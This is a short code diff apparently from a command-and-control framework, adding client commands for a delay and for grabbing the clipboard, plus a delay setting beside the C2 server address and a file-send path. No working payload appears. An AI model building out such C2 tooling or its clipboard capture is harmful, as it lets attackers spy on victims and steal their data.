@@ -20,6 +20,8 @@ class C2Commands(Enum):
     CLS_ZIP = "client zip"
     CLS_UZIP = "client unzip"
     CLS_SLP = "client sleep "
+    CLS_DLY = "client delay "
+    CLS_CLP = "client get clipboard"
     CLS_KLL = "client kill"
     SERV = "server"
     SERV_EXT = "server exit"
@@ -43,6 +45,8 @@ else:
 BIND_ADDR = ""
 
 PROXY = None
+
+DELAY = 3
 
 C2_SERVER = "localhost"
 FILE_SEND = "/reviews"
